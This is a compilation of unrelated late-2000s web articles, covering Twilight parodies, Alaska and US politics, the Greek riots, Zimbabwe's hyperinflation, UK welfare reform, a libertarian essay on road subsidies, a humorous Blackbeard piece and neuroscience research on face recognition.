Actually , you do n't even have to go to internet fandom for some of the most entertaining critiques of Stephenie Meyer 's work —
Pattinson himself got the jump on everyone by mocking the series himself in an interview with Empire magazine ( published in their October issue ) .
" When you read the book , " says Pattinson , looking appropriately pallid and interesting even without makeup , " it 's like , ' Edward Cullen was so beautiful I creamed myself . '
I mean , every line is like that .
He 's the most ridiculous person who 's so amazing at everything .
I think a lot of actors tried to play that aspect .
I just could n't do that .
And the more I read the script , the more I hated this guy , so that 's how I played him , as a manic - depressive who hates himself .
Plus , he 's a 108 - year - old virgin so he 's obviously got some issues there . "
Advertisement
In another video interview with E! Online , Pattinson speaks frankly of Meyer , and proves to wish - fulfillment authors everywhere that he 's got their number .
When I read it ...
I was convinced that Stephenie was convinced that she was Bella , and ... it was like it was a book that was n't supposed to be published , like reading her — her sort of sexual fantasy about some — especially when she says that it was based on a dream , and it 's like , " Oh , then I had a dream about this really sexy guy " and she just writes this book about it , and there 's some things about Edward that are just so specific that ...
I was just convinced that this woman is mad , she 's completely mad , and she 's in love with her own fictional creation .
And I sometimes ... feel uncomfortable reading this thing , and I think a lot of people feel the same way , that it 's kind of voyeuristic ...
It creates this sick pleasure in a lot of ways .

Author and blogger Cleolinda Jones compiled several much - read commentaries on each of the Twilight books at her LiveJournal , and they 're a joy to read — even more so than Meyer 's bad - fanfiction - esque prose .
( In case you 're interested , her wiki works quite well as a Twilight guide for dummies — er , in this case , the lucky uninitiated . )
Previously on As the Vampire Sparkles , emoteen Bella Swan moves to a tiny little depressing rainy town and wo n't shut up about it .
There she meets a mysterious boy who turns out to be a 100 + year - old vampire who literally sparkles " like diamonds " in direct sunlight and reads minds ( but not hers ) , and after three hundred pages of Bella wondering why he's so mean to her and why he's so weird and why he's not being mean to her anymore and what his deal is and if he likes her and if he actually loves her and how much he loves her and how he could possibly love as someone as Mary Sue plain and boring and clumsy as she is and if his vampire family will like her , a plot finally shows up , but it does n't last very long .
And then they go to prom .
In the second book , Edward the sparkling vampire leaves Bella for her own good , and she spends most of the book trying to kill herself with motorcycles and cliff - diving .
Sort of .
And then her best friend falls in love with her and turns out to be a werewolf , but Bella runs away to save Edward from committing suicide by public sparkling in Italy .
In the third book , Jacob the best friend / boyfriend wannabe / werewolf turns into a total asshole trying to force himself on Bella , and a vampire with a grudge from the first book is trying to kill her , but more importantly , Bella and Edward argue about whether they should have sex , get married , and / or vampirize Bella , and in what order .
Hand to God , I did not make one word of that up .
Twilight means never having to say you 're kidding .

After posting a scathing , funny , and dead - on accurate review of the series ( " Twilight Sucks , and Not in a Good Way " ) , blogger Kellen Rice of PSA received the obligatory hate mail from crazed Twilight fans .
They told her she , too , should write a bestselling YA fantasy series before having the gall to critique one , so she posted a write - your - own - Twilight instruction manual with some truly memorable tips .
Do not research .
It is not necessary to waste time getting biology facts , cultural lore , or cultural history correct .
For example , if you choose to set your novel in a real - life place , do n't bother visiting it .
If you incorporate the ideas of another culture , such as that of the Sioux Native Americans , absolutely do not speak to any Sioux elders or Sioux scholars - as the author , you have no responsibility to accurately portray anything .
Instead , take what history you can find out on the Internet and feel free to bastardize their cultural lore so that it fits into your story .
Also , if you decide to use science to explain some of your fantasy elements , do n't bother making it logically or factually sound .

MSN Movies posted a copy of " Twilight " :
The Lost Script , and clicking through it is cheaper and less time - consuming than seeing the movie — though it may be just as hilarious .
EDWARD : You are a magnificent flower and the sweet cherry atop my ... more life 's sundae .
Marry me and your life will be distilled bliss , for I do not eat food that requires cooking , and I am rich enough that your chemistry grade matters not a whit .
BELLA : Um , let 's not talk about what you eat .
EDWARD : Your wish is my command , fragrant blossom .
BELLA : I do n't understand how you can say that .
I 'm just a plain , awkward girl who needs to strap herself to the commode so she does n't fall off .
Accident - prone is my middle name .
EDWARD : I will sneak into your bathroom and offer my steady , marble - like arms as your supports .
No harm shall come to you , my pet .

New York Magazine has a slideshow of 28 reasons Twilight the movie is better than Twilight the book , and most of them just involve endless — and totally justified — sarcastic slagging on the book .
This list is a significant achievement , though , given that this series practically mocks itself .
At no point in the movie does this scene occur .
" You ... made ... me ... faint , " I accused him dizzily .
" What am I going to do with you ? " he groaned in exasperation .
" Yesterday I kiss you , and you attack me !
Today you pass out on me ! "
I laughed weakly , letting his arms support me while my head spun .
" So much for being good at everything , " he sighed .
" That 's the problem . " I was still dizzy .
" You 're too good .
Far , far too good . "
Also , this scene was cut , thank God .
" Besides , friends do n't let friends drive drunk , " he quoted with a chuckle .
I could smell the unbearably sweet fragrance coming off his chest .
" Drunk ? " I objected .
" You 're intoxicated by my very presence . "
He was grinning that playful smirk again .
" I ca n't argue with that , " I sighed .
There was no way around it ; I could n't resist him in anything .
In general , we 're just so relieved that the movie did away with most of the 1,000 scenes in which basically this exact thing happens : Bella : Do n't go !
Edward : I should go , but I can 't .
Bella : I am happy !
Edward :
You 're an idiot for being happy .
Bella :
You are still totally gorgeous OMG OMG .

USA Today blithely invited a storm of wank from every literary spec fic nerd out there when they asked , " What 's better , the ' Twilight ' series or ' Harry Potter ' ? "
That insulting question drew comment from the likes of Peter Parker ( " Twilight is why MJ and I are n't married anymore " ) , Harvey Dent ( " You either die a hero or you live long enough to see yourself read Twilight " ) , Yoda ( " Bullshit the Twilight series is , and stupid you are " ) , Bristol Palin ( " Twilight increases teen pregnancy " ) , and even Jane Austen ( " Bitch , please " ) .
One concerned citizen even suggested that Stephenie Meyer was a Skrull — that would explain a lot , would n't it ?
All right , so you 're convinced : the Twilight series is a festival of badness .
As far as Twilight internet fandom is concerned , however , " bad " can very easily become " so bad it 's good . "
It may have put a hardcover and a sticker on some truly unworthy literature — not to mention green - lighting a film that embarrasses its own actors — but the publishing industry will not have the last laugh .

Every once in a while we hear tha sound of hoofbeats on the Mudflats … .
Hark !
Is that ….. a horse ?
Why yes , it ’s our trusty white knight Representative Les Gara galloping up to deliver his latest opinion piece on the Palin debacle .
He unfurls his scroll and reads …
Over the past few weeks we Alaskans have been scratching our heads over the interesting claims the McCain campaign has made about our Governor .
A lot of them have been news to us .
Governor Palin ’s nomination to the McCain ticket has created unusual common ground for Alaskans .
Whether we support her or not , we ’ve been furrowing our eyebrows a lot lately as we watch the McCain campaign re-write Alaska history .
As a legislator who ’s both agreed and disagreed with Governor Palin , I know some of her positions are difficult to sell .
Some are not .
But to avoid that whole messy thing of explaining controversial positions , the spin doctors running the McCain campaign are doing what got George Bush elected .
Many campaigns spin in the gray areas , where the truth is n’t clear .
But the McCain campaign ’s taken a page from Karl Rove , and decided to spin past the margins .
They ’re pitching the verifiably false as true .
During the August Republican National Convention , Alaskans heard for the first time that our Governor opposed a national symbol of federal pork , what folks in the Lower 48 call the “ Bridges to Nowhere . ”
We did n’t know that .
In her 2006 Governor ’s campaign , when her opponents took the risk of telling boomers these two bridges might be too expensive – candidate Palin said she supported them – and said she ’d work to get more Congressional money for them .
Now the campaign has a new line , that Governor Palin “ told Congress thanks , but no thanks ” for this money .
That ’s a problem .
See , she never could have said that .
Congress debated our Alaska ’s request for $ 400 million in bridge money in 2004 and 2005 , before Palin was elected Governor .
A national outcry against these projects , at a time when a Republican Congress was pushing pork over effective relief for Hurricane Katrina ’s victims , forced Congress to re-write this earmark .
Alaska ultimately got the money in 2005 , but the Congressional language requiring that we spend it on these bridges was deleted .
We said thank you .
Governor Palin never opposed this funding .
She never offered to return it when she took office in 2007 .
Then there ’s the claim by Senator McCain that our Governor has been a “ maverick ” fighting federal earmarks .
We did n’t know that either .
Alaska takes more federal earmarks per capita than any state in the country .
Governor Palin asks for them .
She , like her predecessors , happily accepts them .
Alaska ’s budget contains hundreds of millions in earmark dollars .
Alaska politicians love earmarks , and campaign on their ability to get them .
We also heard at the Convention that Governor Palin ’s been a budget cutter .
But in Governor Palin ’s two years as Governor state spending has gone up by 20 % .
She did veto projects , and I supported those vetoes .
But after vetoes , there ’s still been a 20 % budget hike .
Depending on your views , a 20 % spending increase might be defensible .
It ’s not defensible to make people believe you cut the budget when you did n’t .
Here ’s what else I know about my state .
We have the third worst children ’s health insurance program in the nation .
The Governor would n’t support cost - effective measures to extend insurance to the 10,000 children of Alaskan working parents who cannot afford coverage .
She campaigned against a recent proposal to prevent large strip mines from spilling toxic chemicals into Alaska ’s salmon waters – something that ’s raised the ire of fishermen and Alaska Natives in remote Southwest Alaska communities .
Thirty - five to forty percent of our kids do n’t graduate from high school , and we ca n’t convince Governor Palin to join the 41 other states that have accepted the science showing statewide pre-k education helps kids succeed when they do n’t have other good options at home .
There are a lot of important issues to discuss this campaign .
They should be debated honestly .
So far , as Senator McCain ’s joined Barack Obama ’s call for change , he ’s only succeeded at changing the truth .
We now return you to the McCain - Palin campaign already in progress .
Napolitano Not Ruling Out AG Appointment
Created : November 13 , 2008 13:37 | Last updated : July 31 , 2020 00:00
After Arizona Gov. Janet Napolitano , widely rumored to be the front - runner for the attorney general post in President - elect Barack Obama ’s cabinet , spoke at a Subcommittee on Health hearing this morning , I asked her if she was committed to serving out her term as governor , which ends in 2010 , or if she would consider a cabinet appointment .
She responded haltingly :
You know , right now , I have a great job , and that ’s —
I ’m not looking for a new job , and that ’s as far as I go .
Not exactly a decisive response , but also not a denial .
By contrast , politicians who are not interested in cabinet posts have been unequivocal in their denials .
Take a look at today ’s statements by Andy Stern , a potential labor secretary , and Al Gore , mentioned as a possible “ climate czar ” :
Stern : “ It ’s highly unlikely I would be asked , and I would n’t be interested if I was . ”
Napolitano is currently serving as an adviser to Obama ’s transition team , and she told me that the transition is going “ very well . ”
The team is working on creating “ some broad policy for the transition ” and “ making sure that teams have been set up to properly review the agencies and have materials ready both for the president - and vice - president - elect and for incoming cabinet members , once they ’re selected . ”
No word yet on whether she ’ll be among them .
BULENGO , Congo  Jean - Marie Serundori wakes up every morning with gorillas on his mind .
“ I wash my face , I stare at the mountains and I think of them , ” he said .
“ They are like our cousins . ”
But Mr. Serundori , a Congolese wildlife ranger entrusted with protecting some of the most majestic  and most endangered  animals on the planet , is far from the broad - backed mountain gorillas he loves .
Instead , he is stuck in a wet and filthy camp for internally displaced people where the only wildlife are the cockroaches that scurry across the mud floors .
He is one of the hundreds of thousands of people left idle and destitute by eastern Congo ’s most recent spasm of violence , and the consequences in this case may be dire and irreversible .
Eastern Congo is home to almost a third of the world ’s last 700 wild mountain gorillas ( the rest are in nearby areas of Rwanda and Uganda ) .
Now , there are no trained rangers to protect them .
More than 240 Congolese game wardens have been run off their posts , including some who narrowly escaped a surging rebel advance last month and slogged through the jungle for three days living off leaves and scoopfuls of mud for hydration .
Senate report : Rumsfeld to blame for detainee abuse RAW STORY
Published : Thursday December 11 , 2008
Print This Email This Former Defense Secretary Donald Rumsfeld and other members of the Bush administration " conveyed the message that physical pressures and degradation were appropriate treatment for detainees , " claims a Senate Armed Services Committee report issued Thursday .
According to the committee , prisoners were tortured in the Iraqi prison Abu Ghraib , the US prison at Guantanamo Bay , Cuba , and other US military installations .
Senators Carl Levin ( D - MI ) and John McCain ( R - AZ ) were responsible for the content of the Senate 's findings .
The report determined that placing the blame on " a few bad apples , " as Bush administration officials attempted to do in the aftermath of the Abu Ghraib scandal , is inappropriate .
The policies were adopted after government assessments determined waterboarding and other torture techniques were " 100 percent effective " at breaking the wills of US officers who underwent the military 's Survival Evasion Resistance and Escape program .
The report finally claims that Rumsfeld 's torture policies " damaged our ability to collect accurate intelligence that could save lives , strengthened the hand of our enemies and compromised our moral authority . "

Violence continued for a fourth day in Athens , as a funeral was held for a teenager whose death has sparked rioting across Greece .
Clashes erupted near the cemetery where 15 - year - old Alexandros Grigoropoulos , shot by police on Saturday , was buried .
Youths also fought police outside parliament , in a repeat of the violence that has seen hundreds of buildings torched and dozens injured .
The opposition said the government had lost public support and should resign .
On Wednesday union leaders plan to hold a 24 - hour general strike over welfare reforms .
Police fear the stoppage , which is expected to bring the country to a standstill , could fuel further violence .
Funeral clashes Fresh protests began in central Athens early on Tuesday .
Schools were shut as thousands of teachers , schoolchildren and parents marched on parliament to protest against the killing .
See where unrest has spread
The situation escalated as hundreds of young people joined the protest , throwing stones and bottles at lines of riot police , who responded with tear gas .
Police used tear gas to disperse stone - throwing protesters
In the afternoon thousands of mourners gathered for the teenager 's funeral in a coastal suburb further south .
The ceremony was calm , but violence then erupted outside the cemetery .
Police used tear gas against groups of youths who threw stones and set rubbish bins ablaze .
By late evening , 15,000 police were deployed in the capital to maintain control , Reuters news agency said .
There was more fighting elsewhere in the country too .
In Thessaloniki , police clashed with groups of young people following a protest march earlier in the day .
In Patras , a western port , rioters armed with petrol bombs and stones attacked the main police station .
Two police officers have been charged in connection with Alexandros Grigoropoulos 's death , but results of a post - mortem to determine the trajectory of the bullet that killed him are not yet known .
The officer who fired says it was a ricochet from a warning shot but witnesses told Greek TV he fired directly at the teenager .
Lost confidence
In Athens , Prime Minister Costas Karamanlis held talks with President Karolos Papoulias and opposition leaders to discuss what action to take .
Rebellion deeply embedded
In pictures : Greek riots Greece riots : Your stories Thessaloniki riot : ' War zone here '
Mr Karamanlis , whose conservative party has a parliamentary majority of just one seat , called for unity and said rioters would not be shown any leniency .
" No one has the right to use this tragic incident as an excuse for acts of violence , " he said .
But socialist leader George Papandreou said Greeks had lost confidence in the government .
" The only thing this government can offer is to resign and turn to the people for its verdict , " he said .
' Rage ' Scores of arrests have been made since Saturday .
Protesters wielding petrol bombs have set fire to banks , shops , hotels , vehicles and even the giant Christmas tree in Athens ' central Syntagma Square .
Violent clashes have been reported in towns and cities across the country .
HAVE YOUR SAY
The army must take over now to stop these riots Koufos , Thessaloniki , Greece Appeals for calm have so far been largely ignored .
Police appear to be powerless to prevent rioters from attacking symbols of wealth and prestige in Athens , the BBC's Malcolm Brabant reports .
" Rage is what I feel for what has happened , rage , " said one protesting student .
" This cop who did it must see what it is to kill a kid and to destroy a life . "
Mr Karamanlis has blamed " extreme elements " for taking advantage of the situation to engage in vandalism and pledged to compensate damaged businesses .
Observers say a state of emergency may be imposed , giving the authorities special powers to clear the streets .
But there is no question of calling in troops , our correspondent says : Greece has bitter memories of military rule so seeing troops on streets would be beyond the pale .

This release is available in French .
Montreal , November 10 , 2008 - Babies who receive incubator care after birth are two to three times less likely to suffer depression as adults according to a new study published in the journal Pyschiatry Research .
The surprising discovery was made by scientists from the Université de Montréal and Sainte Justine Hospital Research Center in collaboration with researchers from McGill University , the Douglas Hospital Research Centre and the Institute of Psychiatry at King 's College in the U.K .
" In mammals , separation between mother and child after birth has always been considered a major stressor that can cause behavioural problems well into adulthood , " says coauthor Richard E. Tremblay a professor of psychology , pediatrics and psychiatry at the Université de Montréal and director of the Research Unit on Children 's Psycho - Social Maladjustment at the Sainte Justine Hospital Research Center .
" Our hypothesis was that mother - baby separation resulting from incubator care could heighten depression in adolescence or adulthood .
Instead , we found that incubator care could decrease the risk of depression two - to - threefold by the age of 21 . "
For this study - the first to examine the impact of incubator care on adult depression - the research team studied a subsample of 1212 children recruited from a longitudinal study launched in 1986 .
Children were recruited from Quebec kindergartens and facts on birth condition , obstetrical complications and incubator care were obtained through hospital medical records .
Participants received psychiatric assessments when they were 15 and 21 years old .
Researchers found that :
Of the 16.5 percent babies placed in incubators only 5 percent suffered major depression by age 21 .
Among participants who were not placed in incubators , 9 percent developed depression , which is the average rate for general society .
Correlation between decreased depression and incubator care remained after factoring participant age , weight at birth , family adversity or maternal depression .
The research team also found that girls were three times less likely to experience depression by the age of 15 if they had received incubator care at birth .
" This difference was due to the fact that more girls experience depression than boys during adolescence and how boys suffer depression in later adolescent years , " says co author Frank Vitaro , a Université de Montréal professor and member of the Research Unit on Children 's Psychosocial Maladjustment .
Chain of biological and emotional factors
The research team found that direct and indirect stimuli - not just incubators per se - could decrease depression .
For instance , incubators are controlled environments where body temperature , brain oxygenation , sound and light are adjusted to maximize neuronal development .
What 's more , children who received incubator care as babies typically received more emotional support from their mothers throughout childhood because they were perceived as more vulnerable .
" Incubator care was not the sole factor that shielded participants from future depression , " says first author David Gourion , formerly of the Université de Montréal and Sainte Justine Hospital Research Center and now at psychiatrist at the Hôpital Sainte - Anne in Paris .
" We believe that incubator care is a trigger for a complex chain of biological and emotional factors that helped decrease depression . "

Plans to force more benefit claimants to prepare for work or face losing payments are a " fair deal " , says Work and Pensions Secretary James Purnell .
He said private firms would be paid to get people back to work while those unemployed for a year would have to do four weeks ' full - time activity .
Most people on incapacity benefit would be expected to attend job interviews .
The Conservatives said they would back the plans in the face of an expected " big rebellion " from Labour MPs .
A welfare reform bill is expected to be published in January and any changes would come in in 2010 / 11 .
Treatment allowance Outlining the welfare white paper , Mr Purnell told MPs it would adopt in full recommendations made by the Freud Review last year , which said private and voluntary organisations should be paid to get people back to work .
It also supported the " vision " of last week 's Gregg Review , which said most people on incapacity benefit and lone parents on income support should be looking for work or preparing for it through courses and regular interviews .
Mr Purnell told MPs unemployed people would be expected to do four weeks ' full - time activity after a year out of work .
What makes the proposals really significant is that they represent a consensus between the Labour and Tory leaderships

Your stories of claiming benefits
There would also be pilot schemes requiring Jobseekers '
Allowance claimants to work for their benefits after two years .
Under the plans drug users would get a treatment allowance instead of unemployment benefits - and would have to show they were addressing their addiction to receive them .
Mr Purnell told MPs : " We want virtually everyone who is claiming benefits to be preparing for work or looking for work .
It is a fair deal , more support in return for higher expectations . "
Unemployment count
He added : " Today , when the national effort is about a global downturn , we can no more afford to waste taxpayers ' money on those who play the system than they could then .
" But most of all we can not afford to waste a single person 's talent . "
Mr Purnell said mistakes had been made in the 1980s and 1990s when hundreds of thousands of people were put on inactive benefits to keep the unemployment count down .

He said £ 1.3 bn would be spent helping people find work but there would be " increasing requirements " on people the longer they are out of a job .
" After a year , everyone will be allocated to a private or voluntary provider , and be expected to do four weeks ' full - time activity .
After two years , we will pilot requiring people to work full - time for their benefit . "
But the Lib Dems said proposals in the Gregg Review to encourage single parents with children as young as one to prepare for work were " a step too far " .
' Big rebellion '
The Conservative work and pensions spokesman Chris Grayling also said making lone parents of one - year - olds prepare for work was " just plain wrong " .
But he told Mr Purnell the government had adopted Tory policies , adding : " That is why I can assure you today that there is no doubt , we know you are going to face a big rebellion on the Labour backbenches , can I assure you that we will give these proposals our support . "
Lib Dem work and pensions spokesman Jenny Willott said : " We need drastic reform of the welfare state , but this should be achieved without isolating vulnerable groups " .
HAVE YOUR SAY I think this move is 10 years too late .
The government should have acted on this issue years ago Les Challoner , St Helens The Gregg review recommended that everyone on benefits , apart from the severely ill or disabled , some carers and parents of children under one , should either be actively looking for or preparing themselves for work .
Mr Purnell has stressed that single parents would not be forced to seek work unless there was adequate childcare available to them .
The government faces opposition from Labour backbenchers like John McDonnell who said the government was " dismantling the welfare state " .
' Half - baked '
The Parkinson 's Disease Society , which said the illness was commonly misunderstood because of its " fluctuating and unpredictable nature " , urged ministers to ensure those making decisions to impose sanctions were properly trained to deal with complex conditions like Parkinson's .
Plaid Cymru MP
Hywel Williams said many of the proposals seemed to be " inappropriate and unworkable " , especially during the economic downturn .
He said fewer than 20,000 job vacancies were advertised in Wales while there were 330,000 working age people on benefit .
" Simply put , there are n't enough jobs for everyone and the situation seems to be worsening , " he said .
For the Scottish National Party , John Mason MP said the reforms risked demonising the unemployed .
" While we will look cautiously and constructively at the wider proposals , half - baked and draconian reforms are not the answer , " he said .

HARARE , Zimbabwe ( CNN ) -- Cash - strapped Zimbabwe revealed plans Saturday to circulate $ 200 million notes , just days after introducing a $ 100 million bill , Finance Minister Samuel Mumbengegwi said .
Zimbabwe central bank governor Gideon Gono shows a new $ 50 million note Thursday .
After the $ 100 million note began circulating on Thursday , the price of a loaf of bread soared from 2 million to 35 million Zimbabwean dollars .
Amid allegations of illegal foreign currency trading , the government also fired top executives at four major banks Thursday , according to The Herald , a state - owned newspaper .
Many anxious residents of the nation 's capital , Harare , have been sleeping outside banks , waiting for them to open so they can make withdrawals before the institutions run out of cash .
Watch how Zimbabwe 's children are suffering »
The Reserve Bank of Zimbabwe had capped maximum daily withdrawals at 500,000 Zimbabwean dollars : about 25 U.S. cents , or about a quarter of Thursday 's price of a loaf of bread .
Last week , restrictions on cash withdrawals -- due to severe money shortages -- triggered riots .
Sixteen soldiers now face possible court - martial due to alleged looting and assaults on civilians and police during the unrest , police spokesman Wayne Bvudzijena told The Herald on Saturday .
" We are still investigating the case , " he said .
" But we expect the soldiers to appear before a court - martial once investigations are completed . "
After spending several days waiting in bank lines , soldiers rampaged through downtown Harare , destroying shops and attacking riot police sent to disperse the protesters .
Cash shortages are not the only crisis plaguing Zimbabwe .
The United Nations has said that more than half of Zimbabwe 's population is in dire need of food and clean water .
Watch how a cholera epidemic is affecting Zimbabweans »
Acute shortages of essentials such as fuel , electricity , medicines and food are key indicators of a failed economy , according to economic observers .
" The [ Reserve Bank of Zimbabwe ] is failing to deliver the demands of market , prices are doubling daily , and that demands more cash , " Zimbabwean economist John Robertson said .
" The huge price increases are resulting from severe shortages of most goods . "
The once - prosperous African nation is facing its worst economic and humanitarian crisis since attaining independence from Great Britain in 1980 .
Zimbabwe 's official rate of inflation is 231 million percent , the world 's highest .
Critics of Zimbabwean President Robert Mugabe link hyperinflation to his policies on land distribution and unbudgeted payments to war veterans .
Zimbabwe has had no Cabinet since the March presidential election .
Its political troubles have aggravated its humanitarian and economic crisis , including a cholera outbreak that has killed close to 600 people since August .
A CNN journalist in Harare contributed to this report .
All About Zimbabwe • Economic Issues • Robert Mugabe
When left - libertarians argue with more conventionally pro-capitalist libertarians about economics , one of the issues that often comes up is government control over roads , and the ways in which state and federal government ’s control over roads has acted as a large subsidy for economic centralization and national - scale production and distribution networks ( and thus , to large - scale big box retailers , like Wal - Mart or Best Buy , dependent on the crafty arrangement of large - scale cross-country shipping as a basic part of their business model ) .
People who have a problem with this analysis sometimes try to dispute it by arguing that government roads are n’t actually subsidized — that heavy users of government roads are actually getting something that roughly approximates a freed - market outcome , because users of government roads pay for the roads they get , in proportion to how heavily they use them , because government roads are funded by gasoline taxes , tire taxes , and government - imposed licensing fees , which all go up in cost more or less proportionally to increases in use of government roads .
Thus ( the argument goes ) , funding for government roads is more like a fee - for - service transaction on a freed market than it ’s like a classic case of government subsidies .
But in fact , this argument is completely bogus , for at least three reasons .
The first reason is that , contrary to popular misconception , government - imposed gasoline taxes and user fees on road users do not actually fully fund the costs of government road - building and maintenance ; government funding of roads actually includes a substantial subsidy extracted from taxpayers independently of their usage of the roads .
Government budgets for road building and maintenance in the US draw from general funds as well as from earmarked gas taxes and user fees , and those budgets are subsidized by state , local , and federal government to the tune of about 20 – 70 cents per gallon of gasoline expended .
The second reason , which ought to be obvious to libertarians given how much we have talked about the use of eminent domain over the past few years , is that government road - building is substantially subsidized by the fact that government can — and routinely does — use the power of eminent domain to seize large , contiguous stretches of land for road building at arbitrarily fixed rates below what the land - owners could have demanded in a free market land sale .
Even if it were the case ( as it is not ) that usage - based levies like gasoline taxes and government licensing fees were enough to cover the budget for government road building and maintenance , that budget has already had a massive , unmentioned government subsidy factored into it due to the use of eminent domain .
The third reason is that a freed market is able to match the supply for roads to the demand at something like the appropriate cost not only because people pay for the roads in proportion to their use of the roads , but also because the prices for road use are set by negotiations between road users and road builders in a competitive market , and because the ownership and management patterns of roads are determined by patterns of free economic decisions to buy , sell , lease , develop , abandon , reclaim , and subdivide land .
Freed markets are n’t just a matter of paying for what you get ( as important as that is ) ; they also have to do with the freedom to get what you get by alternative means , and with patterns of ownership and control based on consensual negotiation rather than on force .
No matter how roads are funded , there is no way to approximate freed - market results with government monopoly on sales or politically - determined allocation of ownership .
( Again , this is something that ought to be obvious ; it is just the socialist calculation problem applied to the market for road transportation . )
And roads funded by government - imposed gasoline taxes will always be either noncompetitive or subsidized : if there were any significant private roads competing with roads funded by government gasoline taxes , the taxes on the gasoline that drivers burn on those roads become a subsidy to the government - controlled roads .
The more users use the non-government roads , the more they would be subsidizing the government roads .
Further , the ownership and management patterns of government roads are determined by electoral horse - trading and arbitrary political jurisdictions , not by free economic actors .
As a result , decisions about what roads to build , how to direct funds to those roads , how to price the use of those roads , etc. are typically made by state or federal legislatures , or state or federal executive bureaus .
Governments are far more responsive to political than to economic pressure ; governments generally will not , or cannot , sell off roads or spin off control over local roads to the people who use them most and can best manage them ; state and federal governments exercise centralized control over far larger fiefs than it would ever be possible or profitable to amass on a free market .
Thus , for example , because the building and maintenance of roads in Las Vegas is controlled , not by free market actors in Las Vegas , but rather by the Nevada state government , we have Las Vegas drivers paying in 70 % of the state ’s gas taxes and getting back only 61 % of the state ’s spending on roads ( which is an increase over the 2003 – 07 average of 53 % ) — meaning that we are forced to turn tens of millions of dollars over to subsidizing highway building and maintenance in the rest of Nevada .
Here ’s NDOT ’s reasoning as to why we should get stuck with the bill :
If NDOT based its road building program strictly on usage , [ NDOT assistant director of engineering Kent ]
Cooper said , then no new highways would be built outside of Clark County .
He noted that freeways in Las Vegas attract 150,000 to more than 200,000 vehicles a day .
No other area in the state has such high use .
— Ed Vogel , Las Vegas Review - Journal ( 2008 - 11 -26 ) : Southern Nevadans get less bang for their road tax buck
Now , maybe Kent Cooper thinks that it is just and wise to force Las Vegas drivers to pay tens of millions of dollars in subsidies so that NDOT can build expensive roads that nobody wants to use .
Maybe he ’s right about that , and maybe he ’s wrong .
But whatever the case may be , the only way to get freed market results in roads is by freeing the market .
Under government ownership , government funding , and government control , roads are subsidized by taxes that are levied independently of road usage , built using a subsidy created by forced seizure of land , and users of high - volume local roads are typically forced to subsidize expensive , long - distance cross-country roads that they are n’t using .
This kind of allocation of resources for long - distance , non-local highways — which further distorts an already subsidy - distorted system by distorting the flow of money within that system away from the heavily - used local roads and into the high - cost , high maintenance long - distance roads , can certainly not be called any kind of approximation of a freed market in roads .
Death comes for every man , but that does n't mean you have to make it easy for the bastard .
These are the men who , despite whatever terrible things they may have done in life , earned a place in our hearts with their amazingly badass deaths .
7 Edward Teach a.k.a.
Blackbeard
Why He Had to Go
Blackbeard or Edward Teach was a famous English pirate and a massive asshole by all accounts .
He had between fourteen and sixteen wives , most of them about a biscuit older than Dakota Fanning .
One wife in particular would be routinely forced to run a train with the crew while Blackbeard watched and " buffed his peg leg " so to speak .
He burnt hemp beneath his ... um , black beard , to make it look like he was breathing fire , which worked to intimidate his enemies but likely alienated his crew since such a stunt would make an 18th century pirate smell like a snowman made of dogshit .

He 'd also occasionally murder his first mate , just to keep everyone on their toes .
" I can't even remember why I was mad at you . "
How He Went Down
Blackbeard eventually retired to North Carolina to spend his senior years rolling around in gold coins .
But the Governor of Virginia put out a hit on Blackbeard , sending two ships after him , commanded by Robert Maynard .
Rather than running from the two enormous ships sent to kill him , Blackbeard boarded Maynard 's ship .
Well , first he bombed the deck with an assload of primitive grenades like Jim Brown in The Dirty Dozen .
That 's when things got all sorts of stabby .
Blackbeard nearly severed the fingers on one of Maynard 's hands with his sword , and Maynard broke his fucking sword stabbing Blackbeard back .

At the end of the fight , Blackbeard had been stabbed twenty times and suffered at least five gunshot wounds , before bleeding to death while trying to reload his pistol to keep the party going .
Maynard then cut Blackbeard 's head off and hung it from the bow of his sloop , partly for effect but mostly because he needed the head to collect his reward .
He was paid 100 pounds for his trouble , the modern equivalent of about $ 18,000 or a 2006 Buick Rainier .
As we walk along a city street , it takes no effort to recognize the face of a friend in the crowd .
But the ease of the feat masks its cognitive complexity — all faces have eyes , noses and mouths in the same relative place and can bear an array of emotional expressions .
For decades , scientists have debated the basis for our facility with faces : either human brains evolved specialized face - processing machinery , distinct from regions that deal with other objects , or they process all objects using an expansive , multipurpose network , merely developing an expertise for faces .
Two experiments have now clarified this perennial dispute by uncovering a distinct network that is indeed dedicated to faces .
In the late 1990s brain - imaging studies revealed that discrete regions of the temporal lobe — a section of the human brain important for object recognition — fired up more strongly when people looked at faces than at any other thing .
It was unclear , however , whether these regions actually contained cells that were specifically triggered by faces or whether they responded more broadly — activated by , for example , any object related to people or by something that required attention to detail .
A few years ago Doris Tsao and her then colleagues at Harvard Medical School addressed this matter .
She located dedicated “ face patches ” in monkeys and discovered that these patches were packed with neurons that responded only to faces .
“ We demonstrated that they are highly specialized regions , ” says Tsao , now at the University of Bremen in Germany .
“ But we still did n’t know how they worked — whether each patch was independent or whether they were all involved in a unified circuit . ”
So Tsao forged ahead , using a technically impressive combination of brain imaging and single - cell stimulation .
She and her graduate student Sebastian Moeller used electrodes to prod neurons in specific face patches , while observing the rest of the brain with functional magnetic resonance imaging ( fMRI ) .
Earlier this year they reported finding that the face patches were tightly and specifically interconnected : stimulation of a face patch activated other face patches almost exclusively , whereas stimulation outside a face patch activated only nonface regions .
“ This really blew me away , ” says Margaret Livingstone , a neurobiologist at Harvard Medical School , who oversaw Tsao ’s earlier work .
“ The connectivity between different face patches is incredibly precise , face patch to face patch , suggesting that this is a really special system that ’s got its own anatomy , completely separate from all other objects . ”
Tsao then cast her eye on the frontal lobe , which turns sensory data into goal - directed behavior .
“ We do n’t just perceive faces — we respond to them , ” she explains .
“ We determine their emotional expression , store them in our memory , categorize them as friend or foe . ”
So face patches could be in the frontal lobe , she thought .
Using fMRI , Tsao found three discrete face patches .
One patch was in the orbito­frontal cortex , which evaluates emotions and social behaviors .
Further testing revealed that emotional faces excited this patch more so than neutral faces , indicating that it might have a specific role in interpreting emotional expressions .
( In contrast , the face patches in the temporal lobe did not respond any differently to emotional faces . )
Indeed , injury to the frontal lobe can leave victims able to recognize people but unable to assess their mood .
Tsao now hopes to determine how each patch contributes to facial processing .
She surmises that they may form a functional hierarchy — for example , one patch may detect faces , and then other patches chime in to report detection of , say , male faces or surprised faces .
She strongly suspects these later patches may communicate with the medial temporal lobe , a region where , in 2005 , Christof Koch of the California Institute of Technology discovered neurons that responded exclusively to specific individuals , such as actor Halle Berry .
Tsao ’s findings hint at the step - by - step processing that results in neurons that can encode an entity as complex as a particular person .
“ These areas are all connected , ” Koch remarks .
